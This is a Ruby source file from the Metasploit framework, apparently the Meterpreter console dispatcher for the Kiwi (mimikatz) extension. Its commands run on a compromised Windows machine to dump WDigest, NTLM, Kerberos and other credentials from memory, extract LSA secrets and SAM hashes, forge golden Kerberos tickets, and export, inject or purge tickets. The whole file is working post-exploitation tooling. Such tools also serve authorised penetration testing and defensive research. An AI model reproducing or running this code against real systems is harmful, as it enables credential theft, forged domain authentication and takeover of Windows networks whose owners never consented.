# -*- coding: binary -*-
require 'rex/post/meterpreter'

module Rex
module Post
module Meterpreter
module Ui

###
#
# Kiwi extension - grabs credentials from windows memory.
#
# Benjamin DELPY `gentilkiwi`
# http://blog.gentilkiwi.com/mimikatz
#
# extension converted by OJ Reeves (TheColonial)
#
###
class Console::CommandDispatcher::Kiwi

  Klass = Console::CommandDispatcher::Kiwi

  include Console::CommandDispatcher

  #
  # Name for this dispatcher
  #
  def name
    "Kiwi"
  end

  #
  # Initializes an instance of the priv command interaction. This function
  # also outputs a banner which gives proper acknowledgement to the original
  # author of the Mimikatz 2.0 software.
  #
  def initialize(shell)
    super
    print_line
    print_line
    print_line("  .#####.   mimikatz 2.0 alpha (#{client.platform}) release \"Kiwi en C\"")
    print_line(" .## ^ ##.")
    print_line(" ## / \\ ##  /* * *")
    print_line(" ## \\ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )")
    print_line(" '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)")
    print_line("  '#####'    Ported to Metasploit by OJ Reeves `TheColonial` * * */")
    print_line

    if (client.platform =~ /x86/) and (client.sys.config.sysinfo['Architecture'] =~ /x64/)

      print_line
      print_warning "Loaded x86 Kiwi on an x64 architecture."
    end
  end

  #
  # List of supported commands.
  #
  def commands
    {
      "creds_wdigest"         => "Attempt to retrieve WDigest creds",
      "creds_msv"             => "Attempt to retrieve LM/NTLM creds (hashes)",
      "creds_livessp"         => "Attempt to retrieve LiveSSP creds",
      "creds_ssp"             => "Attempt to retrieve SSP creds",
      "creds_tspkg"           => "Attempt to retrieve TsPkg creds",
      "creds_kerberos"        => "Attempt to retrieve Kerberos creds",
      "creds_all"             => "Attempt to retrieve all credentials",
      "golden_ticket_create"  => "Attempt to create a golden kerberos ticket",
      "kerberos_ticket_use"   => "Attempt to use a kerberos ticket",
      "kerberos_ticket_purge" => "Attempt to purege any in-use kerberos tickets",
      "kerberos_ticket_list"  => "Attempt to list all kerberos tickets",
      "lsa_dump"              => "Attempt to dump LSA secrets"
    }
  end

  #
  # Invoke the LSA secret dump on thet target.
  #
  def cmd_lsa_dump(*args)
    get_privs

    print_status("Dumping LSA secrets")
    lsa = client.kiwi.lsa_dump

    # the format of this data doesn't really lend itself nicely to
    # use within a table so instead we'll dump in a linear fashion

    print_line("Policy Subsystem : #{lsa[:major]}.#{lsa[:minor]}") if lsa[:major]
    print_line("Domain/Computer  : #{lsa[:compname]}") if lsa[:compname]
    print_line("System Key       : #{lsa[:syskey]}") if lsa[:syskey]
    print_line("NT5 Key          : #{lsa[:nt5key]}") if lsa[:nt5key]
    print_line
    print_line("NT6 Key Count    : #{lsa[:nt6keys].length}")

    if lsa[:nt6keys].length > 0
      lsa[:nt6keys].to_enum.with_index(1) do |k, i|
        print_line
        index = i.to_s.rjust(2, ' ')
        print_line("#{index}. ID           : #{k[:id]}")
        print_line("#{index}. Value        : #{k[:value]}")
      end
    end

    print_line
    print_line("Secret Count     : #{lsa[:secrets].length}")
    if lsa[:secrets].length > 0
      lsa[:secrets].to_enum.with_index(1) do |s, i|
        print_line
        index = i.to_s.rjust(2, ' ')
        print_line("#{index}. Name         : #{s[:name]}")
        print_line("#{index}. Service      : #{s[:service]}") if s[:service]
        print_line("#{index}. NTLM         : #{s[:ntlm]}") if s[:ntlm]
        print_line("#{index}. Current      : #{s[:current]}") if s[:current]
        print_line("#{index}. Old          : #{s[:old]}") if s[:old]
      end
    end

    print_line
    print_line("SAM Key Count    : #{lsa[:samkeys].length}")
    if lsa[:samkeys].length > 0
      lsa[:samkeys].to_enum.with_index(1) do |s, i|
        print_line
        index = i.to_s.rjust(2, ' ')
        print_line("#{index}. RID          : #{s[:rid]}")
        print_line("#{index}. User         : #{s[:user]}")
        print_line("#{index}. LM Hash      : #{s[:lm_hash]}") if s[:lm_hash]
        print_line("#{index}. NTLM Hash    : #{s[:ntlm_hash]}") if s[:ntlm_hash]
      end
    end

    print_line
  end

  #
  # Invoke the golden kerberos ticket creation functionality on the target.
  #
  def cmd_golden_ticket_create(*args)
    if args.length != 5
      print_line("Usage: golden_ticket_create user domain sid tgt ticketpath")
      return
    end

    user = args[0]
    domain = args[1]
    sid = args[2]
    tgt = args[3]
    target = args[4]
    ticket = client.kiwi.golden_ticket_create(user, domain, sid, tgt)
    ::File.open( target, 'wb' ) do |f|
      f.write ticket
    end
    print_good("Golden Kerberos ticket written to #{target}")
  end

  #
  # Valid options for the ticket listing functionality.
  #
  @@kerberos_ticket_list_opts = Rex::Parser::Arguments.new(
    "-h" => [ false, "Help banner" ],
    "-e" => [ false, "Export Kerberos tickets to disk" ],
    "-p" => [ true,  "Path to export Kerberos tickets to" ]
  )

  #
  # Output the usage for the ticket listing functionality.
  #
  def kerberos_ticket_list_usage
    print(
      "\nUsage: kerberos_ticket_list [-h] [-e <true|false>] [-p <path>]\n\n" +
      "List all the available Kerberos tickets.\n\n" +
      @@kerberos_ticket_list_opts.usage)
  end

  #
  # Invoke the kerberos ticket listing functionality on the target machine.
  #
  def cmd_kerberos_ticket_list(*args)
    if args.include?("-h")
      kerberos_ticket_list_usage
      return true
    end

    export = false
    export_path = "."

    @@kerberos_ticket_list_opts.parse(args) { |opt, idx, val|
      case opt
      when "-e"
        export = true
      when "-p"
        export_path = val
      end
    }

    tickets = client.kiwi.kerberos_ticket_list(export)

    fields = ['Server', 'Client', 'Start', 'End', 'Max Renew', 'Flags']
    fields << 'Export Path' if export

    table = Rex::Ui::Text::Table.new(
      'Header' => "Kerberos Tickets",
      'Indent' => 0,
      'SortIndex' => 0,
      'Columns' => fields
    )

    tickets.each do |t|
      flag_list = client.kiwi.to_kerberos_flag_list(t[:flags]).join(", ")
      values = [
        "#{t[:server]} @ #{t[:server_realm]}",
        "#{t[:client]} @ #{t[:client_realm]}",
        t[:start],
        t[:end],
        t[:max_renew],
        "#{t[:flags].to_s(16).rjust(8, '0')} (#{flag_list})"
      ]

      if export
        path = "<no data retrieved>"
        if t[:raw]
          id = "#{values[0]}-#{values[1]}".gsub(/[\\\/\$ ]/, '-')
          file = "kerb-#{id}-#{Rex::Text.rand_text_alpha(8)}.tkt"
          path = ::File.expand_path(File.join(export_path, file))
          ::File.open(path, 'wb') do |x|
            x.write t[:raw]
          end
        end
        values << path
      end

      table << values
    end

    print_line
    print_line(table.to_s)
    print_line("Total Tickets : #{tickets.length}")

    return true
  end

  #
  # Invoke the kerberos ticket purging functionality on the target machine.
  #
  def cmd_kerberos_ticket_purge(*args)
    client.kiwi.keberos_ticket_purge
    print_good("Kerberos tickets purged")
  end

  #
  # Use a locally stored Kerberos ticket in the current session.
  #
  def cmd_kerberos_ticket_use(*args)
    if args.length != 1
      print_line("Usage: kerberos_ticket_use ticketpath")
      return
    end

    target = args[0]
    ticket  = ''
    ::File.open(target, 'rb') do |f|
      ticket += f.read(f.stat.size)
    end
    print_status("Using Kerberos ticket stored in #{target}, #{ticket.length} bytes")
    client.kiwi.kerberos_ticket_use(ticket)
    print_good("Kerberos ticket applied successfully")
  end

  #
  # Dump all the possible credentials to screen.
  #
  def cmd_creds_all(*args)
    method = Proc.new { client.kiwi.all_pass }
    scrape_passwords("all", method)
  end

  #
  # Dump all wdigest credentials to screen.
  #
  def cmd_creds_wdigest(*args)
    method = Proc.new { client.kiwi.wdigest }
    scrape_passwords("wdigest", method)
  end

  #
  # Dump all msv credentials to screen.
  #
  def cmd_creds_msv(*args)
    method = Proc.new { client.kiwi.msv }
    scrape_passwords("msv", method)
  end

  #
  # Dump all LiveSSP credentials to screen.
  #
  def cmd_creds_livessp(*args)
    method = Proc.new { client.kiwi.livessp }
    scrape_passwords("livessp", method)
  end

  #
  # Dump all SSP credentials to screen.
  #
  def cmd_creds_ssp(*args)
    method = Proc.new { client.kiwi.ssp }
    scrape_passwords("ssp", method)
  end

  #
  # Dump all TSPKG credentials to screen.
  #
  def cmd_creds_tspkg(*args)
    method = Proc.new { client.kiwi.tspkg }
    scrape_passwords("tspkg", method)
  end

  #
  # Dump all Kerberos credentials to screen.
  #
  def cmd_creds_kerberos(*args)
    method = Proc.new { client.kiwi.kerberos }
    scrape_passwords("kerberos", method)
  end

protected

  def get_privs
    unless system_check
      print_status("Attempting to getprivs")
      privs = client.sys.config.getprivs
      unless privs.include? "SeDebugPrivilege"
        print_warning("Did not get SeDebugPrivilege")
      else
        print_good("Got SeDebugPrivilege")
      end
    else
      print_good("Running as SYSTEM")
    end
  end

  def system_check
    unless (client.sys.config.getuid == "NT AUTHORITY\\SYSTEM")
      print_warning("Not currently running as SYSTEM")
      return false
    end

    return true
  end

  #
  # Invoke the password scraping routine on the target.
  #
  # +provider+ [String] - The name of the type of credentials to dump (used for
  #   display purposes only).
  # +method+ [Block] - Block that contains a call to the method that invokes the
  #   appropriate function on the client that returns the results from Meterpreter.
  #
  def scrape_passwords(provider, method)
    get_privs
    print_status("Retrieving #{provider} credentials")
    accounts = method.call

    table = Rex::Ui::Text::Table.new(
      'Header' => "#{provider} credentials",
      'Indent' => 0,
      'SortIndex' => 4,
      'Columns' =>
      [
        'Domain', 'User', 'Password', 'Auth Id', 'LM Hash', 'NTLM Hash'
      ]
    )

    accounts.each do |acc|
      table << [
        acc[:domain],
        acc[:username],
        acc[:password],
        "#{acc[:auth_hi]} ; #{acc[:auth_lo]}",
        acc[:lm],
        acc[:ntlm]
      ]
    end

    print_line table.to_s
    return true
  end

end

end
end
end
end

